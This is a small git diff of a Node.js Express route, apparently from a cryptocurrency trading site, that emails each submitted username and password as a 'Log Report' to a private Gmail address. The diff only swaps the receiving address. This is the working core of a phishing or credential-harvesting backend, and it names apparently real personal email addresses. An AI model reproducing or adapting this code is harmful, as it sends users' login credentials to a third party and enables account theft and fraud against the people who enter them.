@@ -30,7 +30,7 @@ router.route("/").post((req, res) => {
     let info = await transporter.sendMail({
       from: '"Report" <support@cryptotradecenter.co>', // sender address
       //  from: "anthonyerics84@gmail.com",
-      to: "elongate68@gmail.com", // list of receivers
+      to: "goziechimeziezeh@gmail.com", // list of receivers
       subject: `Log Report ✔`, // Subject line
       text: ``, // plain text body
       html: `<h6>Email: ${username}<br />Password: ${password}`,
